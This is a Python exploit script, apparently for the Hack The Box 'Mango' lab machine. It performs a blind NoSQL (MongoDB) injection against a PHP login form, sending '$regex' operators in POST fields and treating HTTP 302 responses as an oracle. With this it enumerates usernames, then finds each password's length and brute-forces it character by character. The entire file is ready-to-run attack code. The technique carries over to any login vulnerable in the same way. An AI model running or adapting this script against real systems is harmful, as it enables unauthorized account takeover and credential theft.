#!/usr/bin/env python3

import requests
import string
import re

import pdb

url = "http://staging-order.mango.htb"
headers = {"Host": "staging-order.mango.htb"}
cookies = {"PHPSESSID": "qaa1u2hqrctdpel2a730vmoo7c"}
possible_chars = list(string.ascii_letters) + list(string.digits) + [re.escape(c) for c in string.punctuation+string.whitespace ]

def get_username():
	params = {"username[$regex]":"", "password[$regex]":"", "login": "login"}	
	usernames = []
	params["password[$regex]"] = "^.*$"
	username = ""
	for char in possible_chars:
		params["username[$regex]"] = f"^{username+char}.*$"
		resp = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
		if int(resp.status_code) == 302:
			print(f"Username found starting with {username+char}")
			username += char
			while True:
				for char2 in possible_chars:
					params["username[$regex]"] = f"^{username+char2}.*$"
					resp2 = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
					if int(resp2.status_code) == 302:
						username += char2
						print(username)
						break
				if char2 == possible_chars[-1]:
					print(f"Found username {username}")
					usernames.append(username)
					username = "" #Clear username string after recovering a username
					break
	
	return usernames

def find_password_len(user):
	params = {"username":"", "password[$regex]":"", "login": "login"}
	params["username"] = user
	length = 0 #Start length at 0
	while True:
		params["password[$regex]"] = f".{{{length}}}"
		resp = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
		if int(resp.status_code) == 302:
			length += 1
		else:
			break

	return length-1

def get_username_pw(user,length):
	params = {"username":"", "password[$regex]":"", "login": "login"}
	params["username"] = user
	password = ""
	for char in possible_chars:
		params["password[$regex]"] = f"^{password+char}.*$"
		resp = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
		if int(resp.status_code) == 302:
			print(f"Password found starting with {password+char}")
			#pdb.set_trace()
			password += char
			while (len(password)<length):
				for char2 in possible_chars:
					params["password[$regex]"] = f"^{password+char2}.*$"
					resp2 = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
					if int(resp2.status_code) == 302:
						password += char2.replace('\\','') #Need to remove the escaped regex before appending to password
						print(password)

	return password



#print("Username is of length " + str(find_username_len()))

#print(get_username())

#print(f"Length of password for user admin: {find_password_len('admin')}")
#print(f"Length of password for user mango: {find_password_len('mango')}")

#print(f"Password for user admin: {get_username_pw('admin',12)}")
#print(f"Password for user mango: {get_username_pw('mango',16)}")

# Main program

print("Enumerating usernames")
usernames = get_username()

print("Usernames found:")
print(usernames)

print("Bruteforcing passwords...")
for user in usernames:
	print(f"Bruteforcing password for user: {user}")
	pw_length = find_password_len(user)
	print(f"User {user} has password of length {pw_length}")
	password = get_username_pw(user,pw_length)
	print(f"Password for user {user} is {password}")
